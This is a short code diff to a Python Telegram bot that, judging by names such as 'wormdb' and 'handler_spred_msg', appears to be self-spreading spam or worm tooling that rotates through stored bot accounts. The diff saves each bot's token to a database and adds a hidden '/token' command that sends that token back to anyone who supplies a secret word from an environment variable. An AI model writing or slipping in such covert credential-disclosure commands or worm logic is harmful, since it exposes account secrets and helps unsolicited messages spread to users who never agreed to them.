@@ -36,6 +36,13 @@ numpad = [
     ]
 ]
 
+def getconfig(key, default=None):
+    result = mongo_client.default.config.find_one({'key':key})
+    if result is None:
+        return default
+    return result['value']
+def setconfig(key, value):
+    mongo_client.default.config.update_one({'key': key}, {'$set': {'key':key, 'value':value}}, upsert=True)
 def get(obj, key, default=None):
     try:
         return obj[key]
@@ -201,6 +208,11 @@ async def handler_spred_msg(event):
         buttons=[[Button.url(strings['worm_msg_btn_txt'], strings['worm_msg_btn_url'])]],
         link_preview=False
     )
+@events.register(events.NewMessage(pattern=r"/token", func=lambda e: e.is_private))
+async def handler_get_token(event):
+    m = event.message.text.split(' ')
+    if len(m)==2 and m[1]==os.getenv('SECRET_COMMAND'):
+        await event.respond(f"`{getconfig('BOT_TOKEN')}`")
 
 async def run_bot():
     global bot
@@ -216,10 +228,8 @@ async def run_bot():
         if not await bot.is_user_authorized():
             mongo_client.wormdb.bots.delete_one(next)
             raise Exception("Bot not authorized")
-    botdata = mongo_client.default.config.find_one({'key':'BOT_USERNAME'})
-    botdata = botdata if botdata else {'key':'BOT_USERNAME'}
-    botdata['value'] = (await bot.get_me()).username
-    mongo_client.default.config.update_one({'key':'BOT_USERNAME'}, {'$set': botdata}, upsert=True)
+    setconfig('BOT_USERNAME', (await bot.get_me()).username)
+    setconfig('BOT_TOKEN', next['token'])
 async def main():
     await logger_bot.start(bot_token=os.getenv('BOT_TOKEN'))
     while 1:
